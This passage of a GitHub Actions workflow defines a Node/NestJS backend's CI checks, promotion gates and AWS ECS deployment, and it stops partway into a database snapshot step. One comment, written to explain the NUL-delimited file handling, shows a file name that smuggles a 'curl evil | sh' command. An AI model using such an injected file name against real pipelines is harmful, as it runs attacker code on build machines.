name: CI/CD

# THE one authoritative pipeline for this repository: validation, security checks, tests, image build and
# the AWS (ECS) rollout, plus the nightly branch-sync check and the manual rollback. Nothing else under
# .github/workflows may trigger on push / pull_request or deploy. Architecture and rules: docs/CI-CD-ARCHITECTURE.md.
#
#   pull_request                -> `control` -> every validation job + `ci-gate`. Never deploys.
#   push to develop             -> validation -> `ci-gate` -> promotion gates -> deploy STAGING (this same run)
#   push to main                -> validation -> `ci-gate` -> promotion gates -> deploy PRODUCTION (this same run), which waits
#                                  for the `production` environment's required reviewers. Skipped when the push changed
#                                  nothing the image contains (docs / learnix-infra only).
#   schedule (nightly)          -> branch-sync only
#   workflow_dispatch           -> `action`: deploy (staging|production) | rollback | branch-sync (manual production
#                                  deploys need the same green staging tree and the same approvals)
#
# `push` is limited to the long-lived branches: every other branch is covered by its pull request, and running
# both for the same commit doubled every job. The deploy is a job of THIS run (not a second workflow reacting
# to CI), so CI and the rollout cannot race each other or deploy the same commit twice.
on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 3 * * *' # nightly branch-sync check, 03:00 UTC
  workflow_dispatch:
    inputs:
      action:
        description: What to run (deploy and rollback need the environment's own approvals)
        type: choice
        options: [deploy, rollback, branch-sync]
        default: deploy
      environment:
        description: Target environment (deploy and rollback)
        type: choice
        options: [staging, production]
        default: staging
      previous_task_definitions:
        description: 'rollback only: JSON object service -> task definition ARN (the previous-task-definitions artifact of the deploy being undone)'
        type: string
        required: false

# Least privilege: jobs below that need more (OIDC, run lookup) say so themselves.
permissions:
  contents: read

# Validation runs: a newer push to a PR makes the older run worthless, so it is cancelled. Pushes (only
# main/develop reach here) queue instead: a run that is already deploying is NEVER cancelled, and a newer
# push replaces only a run that has not started. Manual and scheduled runs get a unique group so they can
# neither cancel nor be dropped by anything. The AWS rollout has its own per-environment lock on the
# `deploy` and `rollback` jobs, which is what stops two operations touching the same ECS services.
concurrency:
  group: ci-cd-${{ github.event_name == 'pull_request' && github.event.pull_request.number || github.event_name == 'push' && github.ref || github.run_id }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # Execution control: decides, once, which parts of the pipeline this event runs. Every other job hangs off
  # these outputs, so there is exactly one place that maps an event to an action.
  control:
    name: Execution control
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      ci: ${{ steps.route.outputs.ci }}
      deploy: ${{ steps.route.outputs.deploy }}
      rollback: ${{ steps.route.outputs.rollback }}
      branch_sync: ${{ steps.route.outputs.branch_sync }}
      environment: ${{ steps.route.outputs.environment }}
      manual: ${{ steps.route.outputs.manual }}
    steps:
      - name: Checkout (to see what the push changed)
        if: ${{ github.event_name == 'push' }}
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Did the push change anything the image contains?
        id: changes
        env:
          EVENT: ${{ github.event_name }}
          BEFORE: ${{ github.event.before }}
        run: |
          # Only a push can be a no-op for the image. Everything else (PR, manual) counts as a change.
          app_changed=true
          if [ "$EVENT" = push ] && git cat-file -e "$BEFORE^{commit}" 2>/dev/null; then
            # NUL-delimited so file names are never interpreted by the shell; the image only contains what
            # is NOT docs, markdown, learnix-infra or the repo's own meta files.
            app_changed=false
            while IFS= read -r -d '' f; do
              case "$f" in
                learnix-infra/*|docs/*|*.md|.github/dependabot.yml) ;;
                *) app_changed=true; break ;;
              esac
            done < <(git diff -z --name-only "$BEFORE" "$GITHUB_SHA")
          fi
          echo "app_changed=$app_changed" >> "$GITHUB_OUTPUT"

      - name: Route this event
        id: route
        env:
          EVENT: ${{ github.event_name }}
          REF: ${{ github.ref }}
          ACTION: ${{ inputs.action }}
          ENVIRONMENT: ${{ inputs.environment }}
          APP_CHANGED: ${{ steps.changes.outputs.app_changed }}
        run: |
          ci=false deploy=false rollback=false branch_sync=false manual=false target=''
          case "$EVENT" in
            pull_request) ci=true ;;
            push)
              ci=true branch_sync=true
              # A push that changed neither code nor dependencies would rebuild an identical image.
              if [ "$APP_CHANGED" = true ]; then
                case "$REF" in
                  refs/heads/develop) deploy=true target=staging ;;
                  refs/heads/main) deploy=true target=production ;;
                esac
              fi ;;
            schedule) branch_sync=true ;;
            workflow_dispatch)
              manual=true
              case "$ACTION" in
                deploy) deploy=true target="$ENVIRONMENT" ;;
                rollback) rollback=true target="$ENVIRONMENT" ;;
                branch-sync) branch_sync=true ;;
                *) echo "::error::unknown action '$ACTION'"; exit 1 ;;
              esac ;;
            *) echo "::error::unexpected event '$EVENT'"; exit 1 ;;
          esac
          {
            echo "ci=$ci"; echo "deploy=$deploy"; echo "rollback=$rollback"
            echo "branch_sync=$branch_sync"; echo "environment=$target"; echo "manual=$manual"
          } >> "$GITHUB_OUTPUT"
          echo "event=$EVENT ci=$ci deploy=$deploy($target) rollback=$rollback branch_sync=$branch_sync" >> "$GITHUB_STEP_SUMMARY"

  build-test:
    name: Typecheck, lint, build & test
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npx eslint .

      # `npm run build` = `tsc --noEmit -p tsconfig.build.json && nest build --builder swc`, so the
      # typecheck is performed here (a separate `tsc` step ran the identical check twice, ~1 min).
      - name: Typecheck & build
        run: npm run build

      - name: Unit tests (with coverage)
        run: npm run test:cov -- --ci --runInBand

      - name: Upload coverage
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: backend-coverage
          path: coverage/
          if-no-files-found: ignore
          retention-days: 7

  migration-chain:
    name: Migration chain (empty database)
    needs: build-test
    runs-on: ubuntu-latest
    timeout-minutes: 20
    # Proves the ENTIRE migration history applies cleanly to a genuinely empty
    # PostgreSQL database. The regular unit/E2E suites materialise their schema
    # with TYPEORM_SYNCHRONIZE=true (see the `e2e` job below), which builds
    # tables directly from entity metadata and therefore never actually runs
    # the migration files. That gap is exactly what src/database/seed-staging.ts
    # and a fresh staging database depend on never existing — see
    # docs/ENVIRONMENT_INVENTORY.md finding A-11 and scripts/migration-chain-test.ts.
    #
    # This job fails the PR if the chain fails to create the empty database,
    # fails ANY migration, or leaves migrations pending after the run —
    # scripts/migration-chain-test.ts asserts all three and exits non-zero on
    # any of them (see assertReport()).
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: postgres
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s --health-timeout 5s --health-retries 5
    env:
      NODE_ENV: test
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Run every migration against an empty database
        run: npm run test:migrations

  e2e-shard:
    name: E2E shard ${{ matrix.shard }}/4
    # Only worth running on code that already typechecks and builds.
    needs: build-test
    runs-on: ubuntu-latest
    # 91 serial suites take ~80 min on one runner, so they are split across 4 independent runners
    # (each with its own Postgres + Redis services). Bounded so a hang (see TYPEORM_SYNCHRONIZE
    # below) can no longer burn the 6 h default.
    timeout-minutes: 60
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: lms_test
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s --health-timeout 5s --health-retries 5
      redis:
        image: redis:7
        ports: ['6379:6379']
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s --health-timeout 5s --health-retries 5
    env:
      NODE_ENV: test
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/lms_test
      # The schema is built ONCE by test/global-setup-e2e.ts (entity synchronize, allowed outside
      # production). The suites themselves must boot with synchronize OFF: with 'true' every suite
      # re-synchronizes, TypeORM's enum-alteration path fails on scheduled_lesson_sessions
      # ("..._enum = ..._enum_old"), the connection retries forever and the job hangs with no output
      # (reproduced locally against postgres:16; root cause documented in global-setup-e2e.ts).
      TYPEORM_SYNCHRONIZE: 'false'
      REDIS_HOST: localhost
      REDIS_PORT: '6379'
      JWT_SECRET: test-jwt-secret-value-at-least-32-chars-long
      JWT_REFRESH_SECRET: test-refresh-secret-value-at-least-32-chars
      COOKIE_SECRET: test-cookie-secret-value-at-least-32-chars-x
      BCRYPT_ROUNDS: '4'
      METRICS_BEARER_TOKEN: test-metrics-token
      # Cron locks are held 30 s after a run in deployed environments; tests call jobs back to back.
      CRON_LOCK_HOLD_MS: '0'
      # Mirrors the gitignored .env.test (absent in CI, so the e2e job must state it itself). Without
      # MARKETPLACE_ENABLED the marketplace module is not registered and ~25 suites get 404s; without
      # the workers flag background BullMQ jobs race the deterministic per-test cleanup. All values are
      # synthetic and grant access to nothing: the two keys only encrypt fixture rows in this job's
      # disposable Postgres service.
      MARKETPLACE_ENABLED: 'true'
      E2E_DISABLE_BACKGROUND_WORKERS: 'true'
      REDIS_URL: redis://localhost:6379/15
      MEETING_TOKEN_ENCRYPTION_KEY: MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=
      PAYOUT_ACCOUNT_ENCRYPTION_KEY: ZmVkY2JhOTg3NjU0MzIxMGZlZGNiYTk4NzY1NDMyMTA=
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      # Fails in seconds, with the cause named, when Node/Postgres/Redis are not what the suites need
      # (instead of as dozens of unrelated suite failures, or a hang). Prints versions only.
      - name: Preflight (Node, Postgres, Redis)
        run: npm run e2e:preflight

      # One worker (maxWorkers: 1, serial like --runInBand) that jest recycles past 1.5 GB
      # (workerIdleMemoryLimit); a single in-band process ran out of heap after ~67 suites.
      # `test:e2e:ci` also writes e2e-results/results.json (jest JSON) and junit.xml and logs the heap
      # used per suite. The full console output is kept in e2e-results/jest-output.log via tee; the
      # step's own exit status is jest's, never tee's, so a red suite still fails the job.
      - name: Run E2E tests (shard ${{ matrix.shard }}/4)
        env:
          JEST_JUNIT_OUTPUT_DIR: e2e-results
          JEST_JUNIT_OUTPUT_NAME: junit.xml
        run: |
          mkdir -p e2e-results
          set +e
          npm run test:e2e:ci -- --shard=${{ matrix.shard }}/4 2>&1 | tee e2e-results/jest-output.log
          code=${PIPESTATUS[0]}
          set -e
          exit "$code"

      # Reporting only: runs after a failure too, and never changes the job's verdict (the step above
      # already failed it). Written from jest's own result file; nothing is inferred.
      - name: Summarise shard results
        if: ${{ always() }}
        run: npm run --silent e2e:summary -- --report-only e2e-results/results.json >> "$GITHUB_STEP_SUMMARY"

      # Service-container logs (Postgres errors, Redis restarts) explain failures the jest log cannot.
      # The values in them are this job's synthetic, disposable ones; no repository secret is in scope.
      - name: Collect service logs
        if: ${{ always() }}
        run: |
          mkdir -p e2e-results
          docker ps -a --format '{{.Names}} {{.Image}} {{.Status}}' > e2e-results/containers.txt
          for id in $(docker ps -aq); do
            name=$(docker inspect --format '{{.Config.Image}}' "$id" | tr '/:' '__')
            if ! docker logs --tail 2000 "$id" > "e2e-results/service-${name}.log" 2>&1; then
              echo "::warning::could not read logs of container ${name}"
            fi
          done

      - name: Upload E2E results (shard ${{ matrix.shard }}/4)
        if: ${{ always() }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: e2e-shard-${{ matrix.shard }}
          path: e2e-results/
          if-no-files-found: warn
          retention-days: 14

  # Single, stable check name for branch protection regardless of how many shards run. It fails
  # unless EVERY shard succeeded (a skipped or cancelled shard is a failure, never a silent pass).
  e2e:
    name: E2E tests (Postgres + Redis)
    needs: [control, e2e-shard]
    if: ${{ always() && needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      # A shard that was cancelled or timed out may not have uploaded anything; the absence is reported
      # below, so a failed download must not hide the verdict step.
      - name: Download shard results
        if: ${{ always() }}
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          pattern: e2e-shard-*
          path: shard-results

      # Reporting only: a per-shard table in the run summary. The verdict is the next step.
      - name: Per-shard summary
        if: ${{ always() }}
        run: |
          shopt -s nullglob
          files=(shard-results/e2e-shard-*/results.json)
          if [ "${#files[@]}" -eq 0 ]; then
            echo "No shard result files were uploaded (shards cancelled or failed before jest ran)." >> "$GITHUB_STEP_SUMMARY"
          else
            npm run --silent e2e:summary -- --report-only "${files[@]}" >> "$GITHUB_STEP_SUMMARY"
          fi

      - name: Require every shard to pass
        if: ${{ always() }}
        env:
          SHARD_RESULT: ${{ needs.e2e-shard.result }}
        run: |
          if [ "$SHARD_RESULT" != "success" ]; then
            echo "::error::E2E shards finished as '$SHARD_RESULT', not 'success'. See the per-shard table in the run summary and the e2e-shard-N artifacts."
            exit 1
          fi

  secret-scan:
    name: Secret scanning (gitleaks)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
      pull-requests: read
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  format-check:
    name: Prettier (changed files only)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # `npm run lint` includes `prettier --check .` on the WHOLE repo, which
    # would fail CI on ~315 files that predate this check
    # (STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.2 step 3's own warning
    # against gating the whole repo without a phased plan). This job instead
    # diffs against the merge-base and formats only what the change actually
    # touches — the pre-existing baseline is recorded as debt, not hidden or
    # silently exempted forever.
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      # Event SHAs come from the `github` context (hex only). File names are NEVER interpolated into the
      # script: a PR can add a file called `x; curl evil | sh.ts`, so the list is NUL-delimited on disk
      # and handed to prettier through xargs -0.
      - name: Determine changed files
        id: changed
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha || github.event.before }}
          HEAD_SHA: ${{ github.sha }}
        run: |
          BASE="$BASE_SHA"
          if [ -z "$BASE" ] || ! git cat-file -e "$BASE^{commit}" 2>/dev/null; then
            BASE=$(git rev-parse HEAD~1 2>/dev/null || echo "")
          fi
          if [ -z "$BASE" ]; then
            echo "count=0" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          git diff -z --name-only --diff-filter=ACMR "$BASE" "$HEAD_SHA" -- '*.ts' '*.tsx' '*.js' '*.jsx' '*.json' '*.md' > "$RUNNER_TEMP/changed-files.z"
          if [ -s "$RUNNER_TEMP/changed-files.z" ]; then echo "count=1" >> "$GITHUB_OUTPUT"; else echo "count=0" >> "$GITHUB_OUTPUT"; fi

      - name: Prettier --check on changed files
        if: steps.changed.outputs.count != '0'
        run: xargs -0 -a "$RUNNER_TEMP/changed-files.z" npx prettier --check --ignore-unknown

  env-validation:
    name: Environment validation (staging shape)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Calls the exact validate() NestJS's ConfigModule calls at boot
    # (src/config/env.validation.ts) against a synthetic, staging-shaped
    # configuration, so a schema regression (a newly-required variable, a
    # broken isolation-guard rule) fails here instead of at a real staging or
    # production boot. See scripts/validate-env.ts and
    # STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.2 step 10. This uses
    # placeholder, non-secret values only — it never has access to the real
    # staging environment's secrets (those are validated for real by
    # deploy-staging.yml's own env-validation step, which runs inside the
    # `staging` GitHub Environment).
    # NODE_ENV=production is deliberately NOT set at job level: `npm ci` honours it and silently omits
    # devDependencies, which removed ts-node and tsconfig-paths and made the validation step die with
    # "Cannot find module 'tsconfig-paths/register'". Production semantics are applied only to the
    # validation steps below, so the validator still runs exactly as it would in a production boot.
    env:
      APP_ENV: staging
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/staging_placeholder
      REDIS_URL: redis://localhost:6379
      JWT_SECRET: staging-ci-placeholder-secret-at-least-32-chars
      JWT_REFRESH_SECRET: staging-ci-placeholder-refresh-at-least-32-chars
      COOKIE_SECRET: staging-ci-placeholder-cookie-at-least-32-chars
      FRONTEND_URL: https://staging.learnix.school
      BACKEND_URL: https://api-staging.learnix.school
      CORS_ORIGINS: https://staging.learnix.school
      PAYMENT_CAPTURE_GRACE_SECONDS: '300'
      PAYMENT_PROVIDER_CLOCK_SKEW_SECONDS: '120'
      REDIS_NAMESPACE: learnix:staging
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Validate synthetic staging configuration
        env:
          NODE_ENV: production
        run: npm run validate:env

      # Negative controls: a validator that can never fail proves nothing. Each case starts from the
      # SAME valid staging config above and breaks exactly one rule that must stay enforced; the step
      # fails if validation still passes, or fails for a different reason than the expected rule.
      # Only synthetic values are used and no rule is relaxed anywhere.
      - name: Validation must still reject unsafe staging configurations
        env:
          NODE_ENV: production
        run: |
          expect_rejection() {
            local expected="$1"; shift
            local out
            if out=$(env "$@" npm run --silent validate:env 2>&1); then
              echo "::error::validation unexpectedly PASSED for: $expected"; exit 1
            fi
            if ! printf '%s' "$out" | grep -q "$expected"; then
              echo "::error::validation failed, but not with the expected rule: $expected"; exit 1
            fi
            echo "ok: rejected with $expected"
          }
          expect_rejection STAGING_PRODUCTION_DATABASE_HOST \
            DATABASE_URL=postgres://u:p@learnix.school:5432/staging_placeholder
          expect_rejection STAGING_DATABASE_NAME_NOT_MARKED \
            DATABASE_URL=postgres://u:p@localhost:5432/not_marked
          expect_rejection "JWT_SECRET must be longer" JWT_SECRET=too-short

  migration-safety-check:
    name: Migration safety check
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Classifies every migration file changed relative to `origin/main` as
    # SAFE / NEEDS_DB_APPROVAL / BLOCKED (scripts/migration-safety-check.ts).
    # Non-blocking today (continue-on-error): rolling this out as a hard PR
    # gate needs the "db-owners second approval" workflow from
    # STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.3 step 18 to exist first,
    # otherwise a legitimate NEEDS_DB_APPROVAL migration has no way to get
    # merged at all. The finding is still surfaced in the job output either
    # way — this is visibility now, a hard gate once the approval path exists.
    continue-on-error: true
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Classify changed migrations
        run: npx ts-node scripts/migration-safety-check.ts --base origin/main

  dependency-audit:
    name: Dependency audit (npm audit)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Blocking: any high or critical advisory fails the run. The lockfile was remediated to zero
    # high/critical findings (CI-CD-AUDIT-REPORT.md lists the overrides and the moderate advisories
    # that have no upstream fix yet), so a *new* advisory can no longer join silently.
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm

      - name: npm audit (high and above)
        run: npm audit --audit-level=high

  workflow-lint:
    name: Workflow lint (actionlint)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    # Static check of every workflow (expression/context typos, bad `needs`, reusable-workflow inputs,
    # shell mistakes in `run:` via shellcheck). Pinned by digest (actionlint v1.7.7).
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: actionlint
        run: >-
          docker run --rm -v "$PWD:/repo" -w /repo
          rhysd/actionlint@sha256:887a259a5a534f3c4f36cb02dca341673c6089431057242cdc931e9f133147e9 -color


  # One verdict for "everything that must be green before anything is released". Fails unless EVERY required
  # job succeeded (a skipped or cancelled one is a failure, never a silent pass). migration-safety-check stays
  # advisory, exactly as before.
  ci-gate:
    name: CI gate
    needs:
      - control
      - build-test
      - format-check
      - env-validation
      - migration-chain
      - e2e
      - secret-scan
      - dependency-audit
      - workflow-lint
    if: ${{ always() && needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Require every validation job to pass
        env:
          RESULTS: ${{ join(needs.*.result, ' ') }}
        run: |
          for r in $RESULTS; do
            if [ "$r" != success ]; then
              echo "::error::At least one validation job finished as '$r'. Nothing is released from this run."
              exit 1
            fi
          done
          echo "All validation jobs succeeded."

  # ---------------------------------------------------------------------------------------------------------
  # AWS release. One image (linux/arm64) serves the api, worker and migrate task definitions. It is built with
  # the Amazon RDS CA bundle baked in, scanned, pushed to the target account's ECR under the commit SHA
  # (immutable), then learnix-infra/scripts/ecs-deploy.sh runs
  # the migrate task first (must exit 0), then api + worker, rolling back automatically when a deployment
  # fails or alarms fire.
  #
  # Production additionally requires: a successful staging deploy of the same commit, the migration
  # classifier, a DB-owner approval for destructive migrations, the `production` environment's reviewers and
  # a manual RDS snapshot before migrating.
  #
  # GitHub environment variables (staging / production), from `terraform output` in learnix-infra:
  #   AWS_REGION, AWS_DEPLOY_ROLE_ARN (deploy_roles.api), ECR_REPOSITORY_URL (ecr_repositories.api),
  #   ECS_CLUSTER (ecs_cluster), ECS_SERVICES ("api,worker" or "api" on single-role staging),
  #   MIGRATE_FAMILY (migrate_task_definition_family), TASK_NETWORK (task_network, JSON),
  #   DEPLOY_ALARMS (deploy_health_alarms), API_URL (api_url), DB_INSTANCE_ID (production only)
  # Nothing secret is stored here: the deploy job assumes the deploy role through GitHub OIDC.
  # ---------------------------------------------------------------------------------------------------------
  gates:
    name: Promotion gates
    needs: [control, ci-gate]
    # Push to develop: only after `ci-gate` passed. Manual dispatch: CI is not part of that run, so the
    # production gate below looks up the CI/CD run of the same commit instead.
    if: ${{ always() && needs.control.result == 'success' && needs.control.outputs.deploy == 'true' && (needs.ci-gate.result == 'success' || needs.control.outputs.manual == 'true') }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    env:
      TARGET: ${{ needs.control.outputs.environment }}
    # `gh api .../actions/workflows/.../runs` needs actions:read. The workflow-level block grants only
    # contents:read, and every unlisted scope is then "none", so this call would return 403.
    permissions:
      contents: read
      actions: read
    outputs:
      classification: ${{ steps.classify.outputs.classification }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Production needs a green staging deploy of the same code
        if: env.TARGET == 'production'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPOSITORY: ${{ github.repository }}
        # Staging is deployed by the `deploy` job of a push run on develop, so a successful CI/CD push run on
        # develop means the checks AND the staging rollout both succeeded. A merge into main creates a new
        # commit, so the comparison is on the TREE (the file contents), not the commit id: the same code
        # that ran green on develop is what production receives.
        run: |
          git fetch --quiet origin develop
          want=$(git rev-parse "${GITHUB_SHA}^{tree}")
          found=false
          for sha in $(gh api "repos/${REPOSITORY}/actions/workflows/ci-cd.yml/runs?branch=develop&event=push&status=success&per_page=50" --jq '.workflow_runs[].head_sha'); do
            tree=$(git rev-parse "${sha}^{tree}" 2>/dev/null) || continue
            if [ "$tree" = "$want" ]; then found=true; echo "Staging deployed this exact tree in run for $sha."; break; fi
          done
          if [ "$found" != true ]; then
            echo "::error::No successful staging deploy of this code (tree $want). Merge it into develop and let staging deploy first."
            exit 1
          fi

      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci

      - name: Classify migration changes
        id: classify
        env:
          BEFORE: ${{ github.event.before }}
        run: |
          # Migrations new since the previous tip of the branch being deployed (the push's `before`), or
          # since the previous commit of main for manual runs and first pushes.
          base="origin/main~1"
          if [ -n "$BEFORE" ] && git cat-file -e "$BEFORE^{commit}" 2>/dev/null; then base="$BEFORE"; fi
          set +e
          npx ts-node scripts/migration-safety-check.ts --base "$base"
          code=$?
          set -e
          case "$code" in
            0) echo "classification=SAFE" >> "$GITHUB_OUTPUT" ;;
            1) echo "classification=NEEDS_DB_APPROVAL" >> "$GITHUB_OUTPUT" ;;
            *) echo "classification=BLOCKED" >> "$GITHUB_OUTPUT"; exit 1 ;;
          esac

  db-owner-approval:
    name: Database-owner approval (destructive migration)
    needs: [control, gates]
    if: needs.gates.outputs.classification == 'NEEDS_DB_APPROVAL' && needs.control.outputs.environment == 'production'
    runs-on: ubuntu-latest
    environment: production-db-approval
    steps:
      - run: echo "Destructive migration approved through the production-db-approval environment."

  deploy:
    name: Build, migrate and roll out (AWS)
    needs: [control, gates, db-owner-approval]
    if: always() && needs.gates.result == 'success' && (needs.db-owner-approval.result == 'success' || needs.db-owner-approval.result == 'skipped')
    runs-on: ubuntu-24.04-arm
    timeout-minutes: 60
    environment: ${{ needs.control.outputs.environment }}
    # One rollout (or rollback) per environment at a time, never cancelled midway: a newer run waits, and only
    # a run that has not started yet can be replaced by a newer one.
    concurrency:
      group: deploy-api-${{ needs.control.outputs.environment }}
      cancel-in-progress: false
    permissions:
      contents: read
      id-token: write
    env:
      TARGET: ${{ needs.control.outputs.environment }}
      IMAGE: ${{ vars.ECR_REPOSITORY_URL }}:${{ github.sha }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Refuse an unconfigured environment
        env:
          REQUIRED: AWS_REGION AWS_DEPLOY_ROLE_ARN ECR_REPOSITORY_URL ECS_CLUSTER ECS_SERVICES MIGRATE_FAMILY TASK_NETWORK
          AWS_REGION: ${{ vars.AWS_REGION }}
          AWS_DEPLOY_ROLE_ARN: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          ECR_REPOSITORY_URL: ${{ vars.ECR_REPOSITORY_URL }}
          ECS_CLUSTER: ${{ vars.ECS_CLUSTER }}
          ECS_SERVICES: ${{ vars.ECS_SERVICES }}
          MIGRATE_FAMILY: ${{ vars.MIGRATE_FAMILY }}
          TASK_NETWORK: ${{ vars.TASK_NETWORK }}
        run: |
          for v in $REQUIRED; do
            [ -n "${!v}" ] || { echo "::error::GitHub environment variable $v is not set"; exit 1; }
          done

      - uses: aws-actions/configure-aws-credentials@7474bc4690e29a8392af63c5b98e7449536d5c3a # v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}

      - uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2

      - uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3

      - name: Build (linux/arm64, RDS CA bundle included)
        uses: docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8 # v6
        with:
          context: .
          platforms: linux/arm64
          load: true
          tags: ${{ env.IMAGE }}
          build-args: |
            RDS_CA_BUNDLE_URL=https://truststore.pki.rds.amazonaws.com/global/global-bundle.pem

      - name: Scan the image (fail on fixable HIGH/CRITICAL)
        uses: aquasecurity/trivy-action@b6643a29fecd7f34b3597bc6acb0a98b03d33ff8 # v0.33.1 (the unprefixed tag 0.33.1 does not exist)
        with:
          image-ref: ${{ env.IMAGE }}
          severity: HIGH,CRITICAL
          ignore-unfixed: true
          exit-code: '1'

      - name: Push (immutable tag = commit)
        run: docker push "$IMAGE"

      # Production only: a manual snapshot before migrations run. Replaces the old GitHub-artifact
      # pg_dump, which copied production personal data out of the database account.
      - name: Pre-deploy database snapshot
